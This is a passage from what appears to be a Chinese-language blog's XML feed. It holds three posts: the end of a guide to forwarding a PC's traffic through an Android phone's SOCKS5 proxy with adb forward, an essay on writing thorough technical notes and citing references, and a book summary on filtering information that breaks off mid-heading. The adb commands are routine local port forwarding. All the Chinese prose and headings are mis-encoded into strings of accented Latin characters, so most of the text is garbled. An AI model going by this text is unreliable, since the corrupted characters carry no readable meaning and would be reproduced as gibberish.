class="hljs-keyword">no</span>-rebind] REMOTE LOCAL<br>    <span class="hljs-built_in">reverse</span> socket connection using:<br>      tcp:<span class="hljs-symbol">&lt;port&gt;</span> (<span class="hljs-symbol">&lt;remote&gt;</span> may <span class="hljs-keyword">be</span> <span class="hljs-string">&quot;tcp:0&quot;</span> <span class="hljs-keyword">to</span> pick any <span class="hljs-keyword">open</span> port)<br>      localabstract:&lt;unix domain socket name&gt;<br>      localreserved:&lt;unix domain socket name&gt;<br>      localfilesystem:&lt;unix domain socket name&gt;<br><span class="hljs-built_in">reverse</span> --<span class="hljs-built_in">remove</span> REMOTE  <span class="hljs-built_in">remove</span> specific <span class="hljs-built_in">reverse</span> socket connection<br><span class="hljs-built_in">reverse</span> --<span class="hljs-built_in">remove</span>-<span class="hljs-keyword">all</span>     <span class="hljs-built_in">remove</span> <span class="hljs-keyword">all</span> <span class="hljs-built_in">reverse</span> socket connections from device<br></code></pre></td></tr></table></figure><h2 id="PC-ä½¿ç”¨-Android-æ‰‹æœºä»£ç†ä¸Šç½‘çš„æ–¹æ³•"><a href="#PC-ä½¿ç”¨-Android-æ‰‹æœºä»£ç†ä¸Šç½‘çš„æ–¹æ³•" class="headerlink" title="PC ä½¿ç”¨ Android æ‰‹æœºä»£ç†ä¸Šç½‘çš„æ–¹æ³•"></a>PC ä½¿ç”¨ Android æ‰‹æœºä»£ç†ä¸Šç½‘çš„æ–¹æ³•</h2><p>é¦–å…ˆåœ¨æ‰‹æœºä¸Šå¼€å¯ socks5 ä»£ç† 127.0.0.1:9999, ç„¶åç”¨ USB æ•°æ®çº¿è¿æ¥ Android æ‰‹æœºå’Œ PCï¼Œåœ¨ PC ä¸­æ‰§è¡Œä¸‹é¢çš„å‘½ä»¤</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">adb forward tcp:7890 tcp:9999<br></code></pre></td></tr></table></figure><p>è¿™æ ·ä¼šæŠŠ PC 127.0.0.1:7890 è½¬å‘åˆ°æ‰‹æœº 127.0.0.1:9999</p><p>ä½¿ç”¨ <code>adb forward --list</code> æŸ¥çœ‹è¿æ¥å»ºç«‹æƒ…å†µ</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">94e22910</span> tcp:<span class="hljs-number">7890</span> tcp:<span class="hljs-number">9999</span><br></code></pre></td></tr></table></figure><p>ä¸éœ€è¦ä½¿ç”¨æ—¶ï¼Œå¯ä»¥ä½¿ç”¨ <code>adb forward --remove</code> ç§»é™¤è½¬å‘</p><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs oxygene">adb <span class="hljs-keyword">forward</span> --<span class="hljs-keyword">remove</span> tcp:<span class="hljs-number">7890</span><br></code></pre></td></tr></table></figure><p>å‚è€ƒ adb çš„å¸®åŠ©ï¼Œæ‰§è¡Œå‘½ä»¤ <code>adb help</code></p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs vim">forward --<span class="hljs-keyword">list</span>           <span class="hljs-keyword">list</span> <span class="hljs-keyword">all</span> forward socket connections<br>forward [--<span class="hljs-keyword">no</span>-rebind] LOCAL REMOTE<br>    forward socket connection using:<br>      tcp:<span class="hljs-symbol">&lt;port&gt;</span> (<span class="hljs-symbol">&lt;local&gt;</span> may <span class="hljs-keyword">be</span> <span class="hljs-string">&quot;tcp:0&quot;</span> <span class="hljs-keyword">to</span> pick any <span class="hljs-keyword">open</span> port)<br>      localabstract:&lt;unix domain socket name&gt;<br>      localreserved:&lt;unix domain socket name&gt;<br>      localfilesystem:&lt;unix domain socket name&gt;<br>      dev:&lt;character device name&gt;<br>      jdwp:&lt;process pid&gt; (remote <span class="hljs-keyword">only</span>)<br>      vsock:<span class="hljs-symbol">&lt;CID&gt;</span>:<span class="hljs-symbol">&lt;port&gt;</span> (remote <span class="hljs-keyword">only</span>)<br>      acceptfd:<span class="hljs-symbol">&lt;fd&gt;</span> (listen <span class="hljs-keyword">only</span>)<br>forward --<span class="hljs-built_in">remove</span> LOCAL   <span class="hljs-built_in">remove</span> specific forward socket connection<br>forward --<span class="hljs-built_in">remove</span>-<span class="hljs-keyword">all</span>     <span class="hljs-built_in">remove</span> <span class="hljs-keyword">all</span> forward socket connections<br></code></pre></td></tr></table></figure><h2 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h2><p>[1] åœ¨ ColorOS ä¸Šå… root ç©æœºï¼Œè¯·å…ˆæ‰“å¼€è¿™ä¸ªå¼€å…³ - å…‹è±å¾· 2021.06.08<br><a href="https://sspai.com/post/67110">https://sspai.com/post/67110</a></p><p>[2] åœ¨ Android æ‰‹æœºä¸Šçš„ä½¿ç”¨ stunnel - zz 2021.2.24<br><a href="https://www.usmacd.com/cn/android_stunnel/">https://www.usmacd.com/cn/android_stunnel/</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Android</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å¦‚ä½•å†™å¥½ä¸€ç¯‡æŠ€æœ¯ç¬”è®°</title>
    <link href="/cn/how_to_write_technique_note/"/>
    <url>/cn/how_to_write_technique_note/</url>
    
    <content type="html"><![CDATA[<p>ç¿»çœ‹å‰äº›å¹´çš„ç¬”è®°ï¼Œå‘ç°ç¬”è®°å†…å®¹çš„è¯¦å°½ç¨‹åº¦å°†å†³å®šæœªæ¥èƒ½ç•™ä¸‹æ¥å¤šå°‘æœ‰ç”¨çš„çŸ¥è¯†ã€‚ä¸è®ºè®°æ€§å¤šå¥½ï¼Œå¤§å¤šæ•°å†…å®¹éƒ½ä¼šéšç€æ—¶é—´é—å¿˜åœ¨å†å²çš„é•¿æ²³ä¸­ã€‚åœ¨å¾—åˆ°å¬äº†å¾ˆå¤šè¯¾ç¨‹ï¼ŒåŸºæœ¬ä¸Šèƒ½è®°ä½çš„ä¸å¤šï¼Œæœ€ç»ˆèƒ½ç”¨ä¸Šçš„å¯èƒ½è¿˜æ˜¯è®°å½•ä¸‹æ¥çš„ä¸€äº›ä¸œè¥¿ï¼Œå¤äººäº‘ï¼šã€Œä¸åŠ¨ç¬”å¢¨ä¸è¯»ä¹¦ã€è¿˜æ˜¯æŒºæœ‰é“ç†çš„ã€‚</p><p>æŠ€æœ¯ç¬”è®°å’Œå…¶ä»–çš„ä¸€èˆ¬ç¬”è®°ä¸åŒï¼Œè¯¦å°½ç¨‹åº¦å°†å†³å®šç¬”è®°çš„è´¨é‡ï¼Œæœ‰ä¸€äº›åå¤šå¹´å‰çš„ç¬”è®°æˆ‘ç°åœ¨å·²ç»å®Œå…¨çœ‹ä¸æ‡‚äº†ï¼Œæœ‰çš„æ–‡æ¡£ä»…ä»…å†™äº†çŸ­çŸ­å‡ å¥ï¼Œæ˜æ˜¾æ²¡æœ‰å†™å®Œï¼Œä½†çœŸçš„å°±å†ä¹Ÿæƒ³ä¸èµ·ä»»ä½•å†…å®¹äº†ã€‚ç—›å®šæ€ç—›åï¼Œæˆ‘å†³å®šæ€»ç»“ä¸€ç¯‡å¦‚ä½•å†™æŠ€æœ¯ç¬”è®°çš„æ–‡ç« ã€‚</p><h2 id="å†™æŠ€æœ¯æŠ€æœ¯è®°ç¬”è®°æ—¶ï¼Œåº”è¯¥æ³¨æ„å†…å®¹"><a href="#å†™æŠ€æœ¯æŠ€æœ¯è®°ç¬”è®°æ—¶ï¼Œåº”è¯¥æ³¨æ„å†…å®¹" class="headerlink" title="å†™æŠ€æœ¯æŠ€æœ¯è®°ç¬”è®°æ—¶ï¼Œåº”è¯¥æ³¨æ„å†…å®¹"></a>å†™æŠ€æœ¯æŠ€æœ¯è®°ç¬”è®°æ—¶ï¼Œåº”è¯¥æ³¨æ„å†…å®¹</h2><p>å†™è¯¦ç»†çš„è®°å½•æ˜¯ä¸ºäº†åœ¨è‹¥å¹²å¹´åï¼Œå¯ä»¥é‡ç°æ‰€æœ‰çš„æ“ä½œï¼Œå¦‚æœä¸Šä¸‹æ–‡æœ‰ä¸¢å¤±ï¼Œå°†é‡åˆ°å¾ˆå¤§çš„å›°éš¾ã€‚åå¤å­¦ä¹ ï¼Œä¸æ–­è¿­ä»£ï¼Œæ‰€æœ‰çš„ç§¯ç´¯æ‰èƒ½æœ‰æ•ˆç´¯åŠ ï¼Œä¸ºäº†è¾¾åˆ°è¿™ä¸ªç›®çš„ï¼Œå†™æŠ€æœ¯ç¬”è®°è‡³å°‘éœ€è¦åšåˆ°ä»¥ä¸‹å‡ ç‚¹ï¼š</p><ul><li><ol><li>å®Œæ•´æ€§ï¼šå¿…é¡»åŒ…æ‹¬åŸå§‹éœ€æ±‚ã€å…ˆéªŒçŸ¥è¯†ã€ç°æœ‰è§£å†³æ–¹æ¡ˆã€å…·ä½“å®è·µã€å‚è€ƒæ–‡çŒ®ã€‚</li></ol><ul><li>å…·ä½“å®è·µåŒ…æ‹¬ä¸ä½†åŒ…æ‹¬æˆåŠŸçš„ç»éªŒè¿˜åŒ…æ‹¬å¤±è´¥çš„å°è¯•</li></ul></li><li><ol start="2"><li>ä¸¥è°¨æ€§ï¼šæ‰€æœ‰ç¬”è®°å†…å®¹éƒ½ç»è¿‡éªŒè¯ï¼ŒåŒ…æ‹¬å‚è€ƒæ–‡çŒ®ä¸­çš„ç»“è®ºï¼Œæ²¡æœ‰éªŒè¯è¿‡çš„å°±è¯´æœªéªŒè¯ã€‚</li></ol></li><li><ol start="3"><li>å¯å¤ç°ï¼šå®Œæ•´å±•ç¤ºç¯å¢ƒæ­å»ºè¿‡ç¨‹ï¼Œå‘½ä»¤è¡Œçš„æ‰€æœ‰å‚æ•°ï¼Œå®Œæ•´çš„å‘½ä»¤è¡Œè¾“å‡ºï¼Œå®Œæ•´çš„æºä»£ç å’Œç¼–è¯‘å‚æ•°ã€‚</li></ol></li><li><ol start="4"><li>æ·±å…¥ç»†èŠ‚ï¼šé­”é¬¼éƒ½åœ¨ç»†èŠ‚ä¹‹ä¸­ã€‚ç¬”è®°è¯¦ç»†è¯´æ˜å„ç§å‘ç‚¹ï¼Œå…³é”®ç»†èŠ‚çš„ç»†å¾®å·®å¼‚ã€‚</li></ol><ul><li>åˆ¨æ ¹é—®åº•ï¼Œä½¿ç”¨è°ƒè¯•å™¨ç­‰å·¥å…·å±•ç¤ºåº•å±‚çš„ç»†èŠ‚ã€‚</li></ul></li><li><ol start="5"><li>æŒç»­æ€§ï¼šåå¤è¿­ä»£ï¼Œåœ¨è‡ªå·±æ„Ÿå…´è¶£é¢†åŸŸçš„ä¸æ–­ç§¯ç´¯ã€‚</li></ol></li></ul><p>å¤±è´¥çš„å°è¯•å¯èƒ½æ˜¯æœ€å®¹æ˜“å¿½ç•¥çš„åœ°æ–¹ï¼Œæ˜æ˜æŸ¥è¯¢äº†å¾ˆå¤šèµ„æ–™ï¼Œå°è¯•äº†å¾ˆå¤šä¸åŒçš„æ–¹æ³•ï¼Œæœ€åè®°å½•çš„åªæœ‰æˆåŠŸçš„é‚£ä¸€æ¡ã€‚æœ‰ä¸€ç§å¯èƒ½ï¼Œåœ¨æç«¯çš„æƒ…å†µä¸‹ï¼Œæ‰€æœ‰çš„å°è¯•éƒ½å¤±è´¥äº†ï¼Œæ˜¯ä¸æ˜¯å°±å®Œå…¨æ”¾å¼ƒäº†ï¼Ÿ<br>å¦‚æœè®°å½•äº†æ‰€æœ‰å¤±è´¥çš„å°è¯•ï¼Œè¿‡ä¸€æ®µæ—¶é—´åï¼Œä½ å¯èƒ½é‡æ–°å°è¯•ï¼Œä½†æœ‰ä¸ªå‰æä¸Šä¸‹æ–‡æ²¡æœ‰ä¸¢å¤±ï¼Œä¸ç„¶å¾ˆå¯èƒ½é‡å¤èµ°ä¸Šæ¬¡å¤±è´¥çš„å°è¯•ã€‚</p><h2 id="å‚è€ƒèµ„æ–™çš„å­¦é—®"><a href="#å‚è€ƒèµ„æ–™çš„å­¦é—®" class="headerlink" title="å‚è€ƒèµ„æ–™çš„å­¦é—®"></a>å‚è€ƒèµ„æ–™çš„å­¦é—®</h2><p>æˆ‘ä»¥å‰å†™å‚è€ƒèµ„æ–™çš„æ—¶å€™ï¼Œåªæœ‰ä¸€ä¸ªé“¾æ¥ï¼Œæ€»æ˜¯è§‰å¾—è¿™æ ·å°±è¶³å¤Ÿäº†ï¼Œæœ€è¿‘æ„Ÿè§‰åº”è¯¥è¦å†™ä¸ªæ ‡é¢˜ï¼Œè¿™æ ·ä¸€ä¸‹å°±å¯ä»¥çœ‹å‡ºå‚è€ƒèµ„æ–™çš„ä¸»é¢˜ã€‚ä½†å¦‚æœåªè®°å½•å‚è€ƒèµ„æ–™çš„é“¾æ¥å’Œæ ‡é¢˜ï¼Œå…¶å®æ˜¯å­˜åœ¨ä¿¡æ¯ç¼ºå¤±çš„ã€‚<br>ä»æŠ€æœ¯æ¼”è¿›çš„è§’åº¦çœ‹ï¼Œæ–‡ç« å‘è¡¨çš„æ—¶é—´æ˜¯éå¸¸æœ‰æ„ä¹‰çš„ï¼Œä»æ€»ä½“ä¸Šçœ‹æŠ€æœ¯æ˜¯è¿›æ­¥çš„ï¼Œæˆ‘ä»¬åº”è¯¥ä¼˜å…ˆå­¦ä¹ å…ˆè¿›çš„æ–¹æ³•ã€‚ä½œè€…ä¿¡æ¯åˆ™å¯ä»¥è®©æˆ‘ä»¬è®¤è¯†é¢†åŸŸçš„ä¸“å®¶ï¼Œé è°±çš„ä½œè€…çš„å¯ä¿¡åº¦ï¼Œåº”è¯¥ä¸Šè°ƒä¸€ä¸ªçº§åˆ«ã€‚</p><p>scz åœ¨å¾®åšä¸Šä¸¾ä¾‹åˆ©ç”¨å‚è€ƒèµ„æ–™çš„æ—¶é—´ä¿¡æ¯ï¼Œæœç´¢çš„ä¾‹å­ï¼š</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs vim">æœ‰äº›åå¤šå¹´å‰çš„å¾®è½¯blogï¼Œå¯èƒ½å½¢å¦‚:<br>h__p://blogs.technet.<span class="hljs-keyword">com</span>/<span class="hljs-keyword">b</span>/<span class="hljs-symbol">&lt;part0&gt;</span>/archive/<span class="hljs-symbol">&lt;year&gt;</span>/<span class="hljs-symbol">&lt;month&gt;</span>/<span class="hljs-symbol">&lt;day&gt;</span>/<span class="hljs-symbol">&lt;part1&gt;</span>.aspx<br>åŸé“¾æ¥è‚¯å®šä¸å­˜åœ¨äº†ï¼Œå…¶ä¸­ä¸€éƒ¨åˆ†å¯ä»¥æ¢æˆä¸‹é¢è¿™ç§æ ·å­å»è®¿é—®<br>h__ps://learn.microsoft.<span class="hljs-keyword">com</span>/<span class="hljs-keyword">en</span>-us/archive/blogs/<span class="hljs-symbol">&lt;part0&gt;</span>/<span class="hljs-symbol">&lt;part1&gt;</span><br></code></pre></td></tr></table></figure><p>æ‰€ä»¥ï¼Œå‚è€ƒèµ„æ–™åº”è¯¥è®°å½•ï¼šæ ‡é¢˜ã€ä½œè€…ã€æ—¥æœŸã€é“¾æ¥</p><h2 id="ä¸¥è°¨çš„è®°å½•å¸¦æ¥ä¸€ç§æœ‰åº"><a href="#ä¸¥è°¨çš„è®°å½•å¸¦æ¥ä¸€ç§æœ‰åº" class="headerlink" title="ä¸¥è°¨çš„è®°å½•å¸¦æ¥ä¸€ç§æœ‰åº"></a>ä¸¥è°¨çš„è®°å½•å¸¦æ¥ä¸€ç§æœ‰åº</h2><p>ä¸¥è°¨çš„è®°å½•æ˜¯å¯¹å†…å¿ƒçš„ä¸€ç§æ‹·é—®ï¼Œè¦æ±‚ä¸æ–­åœ°é—®è‡ªå·±æ˜¯å¦çœŸææ¸…æ¥šäº†ï¼Œæœ‰æ²¡æœ‰é—æ¼å‰ææ¡ä»¶ï¼Œæ˜¯å¦åªæ˜¯æŸç§å·§åˆã€‚ä¸¥è°¨çš„è®°å½•å¸¦æ¥ä¸€ç§æ–°çš„æœ‰åºï¼Œä¸æ–­å®Œå–„çš„åŸºç¡€æ¦‚å¿µï¼Œä¸æ–­å¢åŠ çš„å„ç§å°è¯•&#x2F;æ–¹æ³•ï¼Œä»è€Œæä¾›è·¨å‡ºçŸ¥è¯†è¾¹ç•Œï¼Œè·³å‡ºæ€ç»´å®šåŠ¿çš„å¯èƒ½æ€§ã€‚</p><h2 id="è®°ç¬”è®°çš„æ€åº¦æ¯”ç¬”è®°æ–¹æ³•é‡è¦"><a href="#è®°ç¬”è®°çš„æ€åº¦æ¯”ç¬”è®°æ–¹æ³•é‡è¦" class="headerlink" title="è®°ç¬”è®°çš„æ€åº¦æ¯”ç¬”è®°æ–¹æ³•é‡è¦"></a>è®°ç¬”è®°çš„æ€åº¦æ¯”ç¬”è®°æ–¹æ³•é‡è¦</h2><p>ç¬”è®°æ˜¯ä¸€ç¬”å¯ä»¥ç§¯ç´¯çš„è´¢å¯Œï¼Œè®¤çœŸå†™ç¬”è®°å¯ä»¥åœ¨æœªæ¥çš„æ—¶é—´é‡Œè·å¾—å¤åˆ©ï¼Œæ€åº¦å†³å®šä¸€åˆ‡ï¼Œè¿™æ¯”æ‰€è°“ç¬¬äºŒå¤§è„‘ï¼Œå¡ç‰‡ç¬”è®°æ³•éƒ½é‡è¦ã€‚ä»»ä½•å¯ä»¥æŒç»­ç§¯ç´¯å¹¶è·å¾—è¿›æ­¥çš„ä¹ æƒ¯åº”è¯¥åšæŒä¸‹å»ã€‚å¯¹äºä¸ªäººæˆé•¿æ¥è¯´ï¼Œä¸æ–­è®°å½•ï¼Œä¸æ–­æ€»ç»“ï¼Œä¸æ–­åˆ†æï¼Œæ‰èƒ½èºæ—‹å‰è¿›ã€‚</p><h2 id="æœ€å"><a href="#æœ€å" class="headerlink" title="æœ€å"></a>æœ€å</h2><p>ä»¥ scz çš„è¯ç»“å°¾ï¼š</p><blockquote><p>è‹¥è‡ªå·±å†™çš„æŠ€æœ¯æ–‡æ¡£ä¸‰ä¸ªæœˆä¹‹åä¹ƒè‡³æ›´é•¿æ—¶é—´è·¨åº¦ï¼Œä¸èƒ½æŒ‡å¯¼è‡ªå·±çš„ç›¸å…³å·¥ä½œï¼Œè¯¥æ–‡æ¡£ä¸¥é‡ä¸åˆæ ¼ã€‚è¯¥æ ‡å‡†å¾ˆé è°±ï¼Œè¯¸å›å¯è‡ªè¡Œæ£€éªŒã€‚</p></blockquote><h2 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h2><p>[1] ç½‘ç»œå®‰å…¨å­¦ä¹ æ–¹æ³•ä¹‹ä¸€  scz    2023-09-07 19:43<br>    <a href="https://scz.617.cn/misc/202309071943.txt">https://scz.617.cn/misc/202309071943.txt</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>PKM</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ã€Šç¬”è®°çš„æ–¹æ³•ã€‹ å¦‚ä½•åšç­›é€‰ï¼Œè·å–é«˜è´¨é‡ä¿¡æ¯</title>
    <link href="/cn/how_to_get_good_info/"/>
    <url>/cn/how_to_get_good_info/</url>
    
    <content type="html"><![CDATA[<p>åœ¨ä¿¡æ¯çˆ†ç‚¸æ—¶ä»£ï¼Œæˆ‘è§‰å¾—ç ”ç©¶å¦‚ä½•è·å¾—æœ‰æ•ˆä¿¡æ¯æ˜¯éå¸¸é‡è¦çš„ã€‚åœ¨ã€Šç¬”è®°çš„æ–¹æ³•ã€‹ä¸­ï¼Œå°‘æ¥ åˆ†äº«äº†å¦‚ä½•è·å–ä¼˜è´¨çš„ä¿¡æ¯çš„æ–¹æ³•ï¼Œåˆ†åˆ«æ˜¯ï¼š</p><ul><li>åšå‡æ³•ï¼šå‰Šå‡ä½ çš„ä¿¡æ¯</li><li>åšåŠ æ³•ï¼šæ·»åŠ ä¹¦æœ¬ä»¥å¤–çš„ä¿¡æ¯æº</li><li>åšä¹˜æ³•ï¼šç”¨å¤šé‡è§†è§’çœ‹å¾…ä¿¡æ¯</li></ul><h2 id="åšå‡æ³•ï¼šå‰Šå‡ä½ çš„ä¿¡æ¯æº"><a href="#åšå‡æ³•ï¼šå‰Šå‡ä½ çš„ä¿¡æ¯æº" class="headerlink" title="åšå‡æ³•ï¼šå‰Šå‡ä½ çš„ä¿¡æ¯æº"></a>åšå‡æ³•ï¼šå‰Šå‡ä½ çš„ä¿¡æ¯æº</h2><p>ç¨€ç¼ºçš„ä¸æ˜¯ä¿¡æ¯ï¼Œè€Œæ˜¯æˆ‘ä»¬çš„æ³¨æ„åŠ›ã€‚æˆ‘ä»¬éœ€è¦é¿å…ä¿¡æ¯è¿‡è½½ï¼Œåˆ†æ•£æˆ‘ä»¬çš„æ³¨æ„åŠ›ï¼Œè¿™æ ·æ‰èƒ½ä¸“æ³¨æœ‰ä»·å€¼çš„ä¿¡æ¯ã€‚</p><h3 id="æ–¹æ³•1ï¼šå‰Šå‡åˆ©ç”¨ä½ æƒ…ç»ªçš„ä¿¡æ¯æº"><a href="#æ–¹æ³•1ï¼šå‰Šå‡åˆ©ç”¨ä½ æƒ…ç»ªçš„ä¿¡æ¯æº" class="headerlink" title="æ–¹æ³•1ï¼šå‰Šå‡åˆ©ç”¨ä½ æƒ…ç»ªçš„ä¿¡æ¯æº"></a>æ–¹æ³•1ï¼šå‰Šå‡åˆ©ç”¨ä½ æƒ…ç»ªçš„ä¿¡æ¯æº</h3><ul><li>æ¯”å¦‚å°†è¢« GPT å–ä»£çš„ 30 ä¸ªå²—ä½ï¼Œå…¶ä¸­æœ‰ä½ çš„å—ï¼Ÿ</li></ul><h3 id="æ–¹æ³•2ï¼šå‰Šå‡è®©è‡ªå·±è¿‡äºèˆ’é€‚çš„ä¿¡æ¯æº"><a href="#æ–¹æ³•2ï¼šå‰Šå‡è®©è‡ªå·±è¿‡äºèˆ’é€‚çš„ä¿¡æ¯æº" class="headerlink" title="æ–¹æ³•2ï¼šå‰Šå‡è®©è‡ªå·±è¿‡äºèˆ’é€‚çš„ä¿¡æ¯æº"></a>æ–¹æ³•2ï¼šå‰Šå‡è®©è‡ªå·±è¿‡äºèˆ’é€‚çš„ä¿¡æ¯æº</h3><ul><li>æ¯”å¦‚æ²¡æœ‰å¢é‡ä¿¡æ¯ï¼Œä¸èƒ½å¸¦æ¥æ–°çŸ¥å’Œå¯å‘ä¿¡æ¯æº</li><li>è§‚ç‚¹å¾ˆç†Ÿæ‚‰å’Œè®¤åŒçš„ä¿¡æ¯æºï¼Œå®¹æ˜“åŸ¹å…»æƒ°æ€§</li></ul><h3 id="æ–¹æ³•3ï¼šå‰Šå‡ç¼ºä¹å…·ä½“äº‹å®çš„ä¿¡æ¯æº"><a href="#æ–¹æ³•3ï¼šå‰Šå‡ç¼ºä¹å…·ä½“äº‹å®çš„ä¿¡æ¯æº" class="headerlink" title="æ–¹æ³•3ï¼šå‰Šå‡ç¼ºä¹å…·ä½“äº‹å®çš„ä¿¡æ¯æº"></a>æ–¹æ³•3ï¼šå‰Šå‡ç¼ºä¹å…·ä½“äº‹å®çš„ä¿¡æ¯æº</h3><ul><li>æ²¡æœ‰äº‹å®ä¾æ®ã€å¤§é‡æ˜¥ç§‹ç¬”æ³•ã€ä¸ç¬¦åˆåŸºæœ¬é€»è¾‘çš„è¿‡äºä¸»è§‚çš„è§‚ç‚¹çš„ä¿¡æ¯æº</li></ul><h2 id="åšåŠ æ³•ï¼šæ·»åŠ ä¹¦æœ¬ä»¥å¤–çš„ä¿¡æ¯æº"><a href="#åšåŠ æ³•ï¼šæ·»åŠ ä¹¦æœ¬ä»¥å¤–çš„ä¿¡æ¯æº" class="headerlink" title="åšåŠ æ³•ï¼šæ·»åŠ ä¹¦æœ¬ä»¥å¤–çš„ä¿¡æ¯æº"></a>åšåŠ æ³•ï¼šæ·»åŠ ä¹¦æœ¬ä»¥å¤–çš„ä¿¡æ¯æº</h2><ul><li>ä¹¦æœ¬ä¿¡æ¯çš„ç¬¬ä¸€ä¸ªé—®é¢˜ï¼šä¹¦æœ¬ä¸Šçš„çŸ¥è¯†ä¸å¤ŸåŠæ—¶ï¼Œè·Ÿä¸ä¸Šæ–°æŠ€æœ¯</li><li>ä¹¦æœ¬ä¿¡æ¯çš„ç¬¬äºŒä¸ªé—®é¢˜ï¼šä¹¦æœ¬ä¸Šå­¦æ¥çš„å¤§å¤šæ˜¯ç†è®ºï¼Œç†è®ºå’Œå®é™…æƒ…å†µæ€»æ˜¯æœ‰äº›å·®åˆ«</li></ul><h3 id="æ–¹æ³•1ï¼šæŠŠä»–äººä½œä¸ºä¿¡æ¯æºï¼Œå¬å®è·µè€…è¨€"><a href="#æ–¹æ³•1ï¼šæŠŠä»–äººä½œä¸ºä¿¡æ¯æºï¼Œå¬å®è·µè€…è¨€" class="headerlink" title="æ–¹æ³•1ï¼šæŠŠä»–äººä½œä¸ºä¿¡æ¯æºï¼Œå¬å®è·µè€…è¨€"></a>æ–¹æ³•1ï¼šæŠŠä»–äººä½œä¸ºä¿¡æ¯æºï¼Œå¬å®è·µè€…è¨€</h3><ul><li>1ï¼‰å¬å®è·µè€…è®²è¿°äº‹å®æ—¶ï¼Œæ³¨æ„ä»–åœ¨å™è¿°è¿‡ç¨‹ä¸­æåŠçš„ç»†èŠ‚ã€‚å……æ»¡ç»†èŠ‚çš„äº‹å®ä¿¡æ¯ï¼Œè¿œæ¯”å……æ»¡æˆå‰§æ€§çš„å®å¤§å™äº‹æ›´æœ‰ä»·å€¼</li><li>2ï¼‰å¬å®è·µè€…è®²è¿°äº‹å®æ—¶ï¼Œé‡ç‚¹å¬ä»–å¤ç›˜å¤±è´¥çš„ç»å†</li><li>3ï¼‰å°½é‡ä¸è¦çœ‹ç¬¬ä¸‰æ–¹çš„å™è¿°ï¼Œè€Œè¦çœ‹å®è·µè€…è‡ªå·±å†™çš„æ–‡ç« æˆ–æ¥å—çš„é‡‡è®¿ï¼Œç¡®ä¿å¾—åˆ°ä¸€æ‰‹çš„ä¿¡æ¯</li></ul><h3 id="æ–¹æ³•2ï¼šäº²è‡ªä¸‹åœºå®è·µ"><a href="#æ–¹æ³•2ï¼šäº²è‡ªä¸‹åœºå®è·µ" class="headerlink" title="æ–¹æ³•2ï¼šäº²è‡ªä¸‹åœºå®è·µ"></a>æ–¹æ³•2ï¼šäº²è‡ªä¸‹åœºå®è·µ</h3><ul><li>1ï¼‰ç°åœºè§‚å¯Ÿï¼Œç°åœºè°ƒç ”</li><li>2ï¼‰æŠ•å…¥æ—¶é—´ï¼ŒæŠ•å…¥é‡‘é’±ï¼Œäº²èº«æ„Ÿå—</li></ul><h2 id="åšä¹˜æ³•ï¼šç”¨å¤šé‡è§†è§’çœ‹å¾…ä¿¡æ¯"><a href="#åšä¹˜æ³•ï¼šç”¨å¤šé‡è§†è§’çœ‹å¾…ä¿¡æ¯" class="headerlink" title="åšä¹˜æ³•ï¼šç”¨å¤šé‡è§†è§’çœ‹å¾…ä¿¡æ¯"></a>åšä¹˜æ³•ï¼šç”¨å¤šé‡è§†è§’çœ‹å¾…ä¿¡æ¯</h2><h3 id="æ–¹æ³•1-è€ƒå¯Ÿæ¦‚å¿µ"><a href="#æ–¹æ³•1-è€ƒå¯Ÿæ¦‚å¿µ" class="headerlink" title="æ–¹æ³•1: è€ƒå¯Ÿæ¦‚å¿µ"></a>æ–¹æ³•1: è€ƒå¯Ÿæ¦‚å¿µ</h3><ul><li>å‘ä¸‹çœ‹ï¼Œå°†æ¨¡ç³Šçš„æ¦‚å¿µç•Œå®šåœ°æ›´æ¸…æ™°ï¼Œå¯¹å®¢è§‚äº‹ç‰©ã€å®¢è§‚äº‹å®çš„è®¤è¯†ä¼šæ›´åŠ æ·±å…¥</li></ul><h3 id="æ–¹æ³•2-å¯»æ‰¾èŒƒå¼"><a href="#æ–¹æ³•2-å¯»æ‰¾èŒƒå¼" class="headerlink" title="æ–¹æ³•2: å¯»æ‰¾èŒƒå¼"></a>æ–¹æ³•2: å¯»æ‰¾èŒƒå¼</h3><ul><li>å‘ä¸Šçœ‹ï¼Œå¯»æ‰¾å¯è¿ç§»èŒƒå¼ï¼ŒæŠ½è±¡ä¸€å±‚</li></ul><h3 id="æ–¹æ³•3-é¡ºè—¤æ‘¸ç“œ"><a href="#æ–¹æ³•3-é¡ºè—¤æ‘¸ç“œ" class="headerlink" title="æ–¹æ³•3: é¡ºè—¤æ‘¸ç“œ"></a>æ–¹æ³•3: é¡ºè—¤æ‘¸ç“œ</h3><ul><li>å‘å››å‘¨çœ‹, æ‰¾åˆ°ä¿¡æ¯ç›¸å…³è”çš„çº¿ç´¢ï¼Œé€ä¸€æ‹æ¸…</li></ul><h2 id="å¤šä¸ªç‹¬ç«‹ä¿¡æ¯æºï¼Œäº¤å‰éªŒè¯"><a href="#å¤šä¸ªç‹¬ç«‹ä¿¡æ¯æºï¼Œäº¤å‰éªŒè¯" class="headerlink" 